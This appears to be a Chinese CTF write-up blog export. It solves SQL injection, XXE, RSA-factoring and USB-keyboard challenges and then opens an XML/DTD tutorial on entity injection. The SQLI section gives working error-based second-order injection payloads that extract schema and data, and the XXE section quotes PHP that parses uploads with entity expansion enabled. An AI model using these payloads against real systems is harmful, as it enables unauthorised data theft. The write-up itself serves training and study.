<h1 id="Web3-SQLI"><a href="#Web3-SQLI" class="headerlink" title="Web3 SQLI"></a>Web3 SQLI</h1><p>几乎RCTF2015 easysql的原题，就改了个flag的位置，修改密码的地方存在二次注入，利用报错可以拿到数据。</p>
<p>注册如下用户名:<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Lethe"||updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="keyword">database</span>())),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p>登陆后修改密码造成二次注入：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200329155336514.png" alt="在这里插入图片描述"><br>然后同样的步骤得到列名：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Lethe"||updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name=<span class="string">'flag'</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2020/03/30/YLB-CTF-Writeup/20200329155459916.png" alt="在这里插入图片描述"><br>得到flag：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Lethe"||updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(flag))<span class="keyword">from</span>(flag)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2020/03/30/YLB-CTF-Writeup/20200329155644552.png" alt="在这里插入图片描述"></p>
<h1 id="Web4-XXE"><a href="#Web4-XXE" class="headerlink" title="Web4 XXE"></a>Web4 XXE</h1><p>利用docx文件进行xxe，并且给了源码:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $target_file = getcwd().<span class="string">"/upload/"</span>.md5($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $target_file)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $result = @file_get_contents(<span class="string">"zip://"</span>.$target_file.<span class="string">"#docProps/core.xml"</span>);</span><br><span class="line">            $xml = <span class="keyword">new</span> SimpleXMLElement($result, LIBXML_NOENT);</span><br><span class="line">            $xml-&gt;registerXPathNamespace(<span class="string">"dc"</span>, <span class="string">"http://purl.org/dc/elements/1.1/"</span>);</span><br><span class="line">            <span class="keyword">foreach</span>($xml-&gt;xpath(<span class="string">'//dc:title'</span>) <span class="keyword">as</span> $title)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Title '"</span>.$title . <span class="string">"' has been added.&lt;br/&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $e;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"上传文件不是一个docx文档."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传失败."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到是从docProps目录下的core.xml读取xml，所以把docx文件解压后在core.xml里构造payload：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327170815267.png" alt="在这里插入图片描述"><br>然后在压缩回docx文件：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327170910380.png" alt="在这里插入图片描述"><br>上传该docx文件即可得到flag：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327170945365.png" alt="在这里插入图片描述"></p>
<h1 id="Crypto2-RSABackDoor"><a href="#Crypto2-RSABackDoor" class="headerlink" title="Crypto2 RSABackDoor"></a>Crypto2 RSABackDoor</h1><p>参考：<a href="https://blog.csdn.net/qq_29457453/article/details/104918136" target="_blank" rel="noopener">https://blog.csdn.net/qq_29457453/article/details/104918136</a></p>
<p>脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapx</span><span class="params">(x)</span>:</span></span><br><span class="line">    x = (pow(x, n<span class="number">-1</span>, n)+<span class="number">3</span>) % n</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">n = <span class="number"></span></span><br><span class="line"></span><br><span class="line">x1 = x2 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    x1 = mapx(x1)</span><br><span class="line">    x2 = mapx(mapx(x2))</span><br><span class="line">    p = gcd(x1-x2, n)</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number"></span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure></p>
<p>运行得到flag：<br><img src="/2020/03/30/YLB-CTF-Writeup/2020032717243017.png" alt="在这里插入图片描述"></p>
<h1 id="Misc3-Keyboard"><a href="#Misc3-Keyboard" class="headerlink" title="Misc3    Keyboard"></a>Misc3    Keyboard</h1><p>先执行下面命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tshark -r u.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure></p>
<p>网上找到下面脚本：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>, <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>, <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>, <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>, <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>, <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>, <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,<span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,<span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>, <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>, <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>, <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>, <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>, <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>, <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&amp;"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,<span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">"&lt;"</span>,<span class="string">"37"</span>:<span class="string">"&gt;"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">'0'</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">'2'</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">"00"</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">'2'</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">'[unknown]'</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line">print(<span class="string">""</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">'&lt;DEL&gt;'</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">"&lt;CAP&gt;"</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'output :'</span> + <span class="string">""</span>.join(output))</span><br></pre></td></tr></table></figure></p>
<p>得到：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327172600480.png" alt="在这里插入图片描述"><br>在vim中敲入对应的按键得到：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327172659487.png" alt="在这里插入图片描述"><br>可能哪里敲错了(应该是honk和Of)，得到压缩包的密码为：honkover1esOfNanle</p>
<p>解压得到flag：<br><img src="/2020/03/30/YLB-CTF-Writeup/20200327172857396.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>XML实体注入攻击</title>
    <url>/2019/08/15/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h3 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h3><p><br></p>
<h5 id="一、XML"><a href="#一、XML" class="headerlink" title="一、XML"></a>一、XML</h5><p><a href="https://www.w3school.com.cn/xml/index.asp" target="_blank" rel="noopener">XML教程</a></p>
<p><strong>1、什么是 XML?</strong></p>
<ul>
<li><p>XML 指可扩展标记语言（EXtensible Markup Language）</p>
</li>
<li><p>XML 是一种标记语言，很类似 HTML</p>
</li>
<li><p>XML 的设计宗旨是传输数据，而非显示数据</p>
</li>
<li><p>XML 标签没有被预定义。您需要自行定义标签</p>
</li>
<li><p>XML 被设计为具有自我描述性。</p>
</li>
</ul>
<ul>
<li>XML 是 W3C 的推荐标准</li>
</ul>
<p><strong>2、XML 与 HTML 的主要差异</strong></p>
<ul>
<li><p>XML 不是 HTML 的替代。</p>
</li>
<li><p>XML 和 HTML 为不同的目的而设计：</p>
</li>
<li><p>XML 被设计为传输和存储数据，其焦点是数据的内容。</p>
</li>
<li><p>HTML 被设计用来显示数据，其焦点是数据的外观。</p>
</li>
<li><p>HTML 旨在显示信息，而 XML 旨在传输信息。</p>
</li>
</ul>
<p><strong>3、XML语法规则</strong></p>
<ul>
<li><p>所有 XML 元素都须有关闭标签</p>
</li>
<li><p>XML 标签对大小写敏感</p>
</li>
<li><p>XML 必须正确地嵌套</p>
</li>
<li><p>XML 文档必须有根元素</p>
</li>
<li><p>XML 的属性值须加引号</p>
</li>
<li><p>XML 中的注释与HTML类似</p>
</li>
<li><p>在 XML 中，空格会被保留</p>
</li>
<li><p>XML 以 LF 存储换行</p>
</li>
</ul>
<p><strong>4、XML示例：</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">"COOKING"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span>Everyday Italian<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Giada De Laurentiis<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>30.00<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">"CHILDREN"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span>Harry Potter<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>J K. Rowling<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>29.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">"WEB"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span>Learning XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Erik T. Ray<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2003<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>39.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端，上述实例可以用下图表示：<br><img src="/2019/08/15/XML实体注入攻击/20190815210141912.png" alt="在这里插入图片描述"></p>
<p><strong>5、XML实体引用</strong></p>
<p>在 XML 中，一些字符拥有特殊的意义。如果把字符 <code>&lt;</code> 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p>
<p>这样会产生 XML 错误：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</span><br></pre></td></tr></table></figure>
<p>为了避免这个错误，用实体引用来代替 <code>&lt;</code> 字符：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</span><br></pre></td></tr></table></figure>
<p>在 XML 中，有 5 个预定义的实体引用：<br><img src="/2019/08/15/XML实体注入攻击/20190815210615212.png" alt="在这里插入图片描述"><br><br></p>
<h5 id="二、DTD"><a href="#二、DTD" class="headerlink" title="二、DTD"></a>二、DTD</h5><p><a href="https://www.w3school.com.cn/dtd/index.asp" target="_blank" rel="noopener">DTD教程</a></p>
<p><strong>1、什么是DTD?</strong></p>
<ul>
<li><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p>
</li>
<li><p>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</p>
</li>
<li><p>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p>
</li>
<li><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
</li>
</ul>
<p><strong>2、内部的 DOCTYPE 声明</strong></p>
<p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure>
<p>带有 DTD 的 XML 文档实例:<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note[</span></span><br><span class="line"><span class="meta">    &lt;!ELEMENT note (to,from,heading,body)&gt;//定义 note 元素有四个元素："to、from、heading,、body"</span></span><br><span class="line"><span class="meta">    &lt;!ELEMENT to (#PCDATA)&gt;定义 to 元素为 "#PCDATA" 类型</span></span><br><span class="line"><span class="meta">    &lt;!ELEMENT from (#PCDATA)&gt;定义 from 元素为 "#PCDATA" 类型</span></span><br><span class="line"><span class="meta">    &lt;!ELEMENT heading (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ELEMENT body (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>Georage<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>3、外部文档声明</strong></p>
<p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note SYSTEM "note.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是包含 DTD 的 “note.dtd” 文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">note</span> (<span class="attr">to</span>,<span class="attr">from</span>,<span class="attr">heading</span>,<span class="attr">body</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">to</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">from</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">heading</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">body</span> (#<span class="attr">PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>4、DTD实体</strong><br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
<p>实体又分为一般实体和参数实体:</p>
<ul>
<li><p>一般实体指代的是将来XML数据文档要用到的文本或数据。</p>
</li>
<li><p>而参数实体是在DTD文档内定义的一种DTD信息，所代表的是DTD定义的一部分，不能在XML文档中使用，也不能在DTD中定义。</p>
</li>
</ul>
<p><strong>（1）一般实体的声明语法:</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名 "实体内容"&gt;</span></span><br></pre></td></tr></table></figure>
